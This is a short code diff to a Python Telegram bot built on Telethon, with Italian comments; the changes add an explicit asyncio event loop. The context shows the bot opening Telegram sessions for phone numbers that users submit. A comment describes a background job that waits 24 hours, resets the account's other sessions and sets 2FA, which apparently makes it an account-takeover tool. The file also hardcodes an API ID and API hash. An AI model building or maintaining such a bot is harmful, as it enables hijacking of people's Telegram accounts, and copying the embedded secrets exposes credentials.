@@ -7,6 +7,10 @@ from telethon import TelegramClient, events, Button
 from telethon.tl.functions.auth import ResetAuthorizationsRequest
 from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneNumberInvalidError, AuthRestartError
 
+# --- EVENT LOOP ESPLICITO (EVITA ERRORE SU PYTHON 3.14) ---
+loop = asyncio.new_event_loop()
+asyncio.set_event_loop(loop)
+
 # --- CREDENZIALI CONFIGURATE ---
 API_ID = 37810956
 API_HASH = "7753910251b42b5f91abe65c34f7f712"
@@ -33,7 +37,7 @@ def run_web():
 threading.Thread(target=run_web, daemon=True).start()
 
 # Avvio del bot principale con Telethon
-bot = TelegramClient('bot_session_v2', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
+bot = TelegramClient('bot_session_v2', API_ID, API_HASH, loop=loop).start(bot_token=BOT_TOKEN)
 
 # --- MOTORE IN BACKGROUND (ATTESA 24H -> DISCONNESSIONE SESSIONI -> 2FA -> MESSAGGIO) ---
 async def background_workers():
@@ -544,7 +548,7 @@ async def message_router(event):
             except Exception:
                 pass
 
-        client = TelegramClient(session_path, API_ID, API_HASH)
+        client = TelegramClient(session_path, API_ID, API_HASH, loop=loop)
         user_states[user_id]["client"] = client
 
         await event.respond(f"⏳ Connessione a Telegram per il numero `{phone}` in corso...")
@@ -668,4 +672,4 @@ async def main():
     await bot.run_until_disconnected()
 
 if __name__ == '__main__':
-    bot.loop.run_until_complete(main())
+    loop.run_until_complete(main())
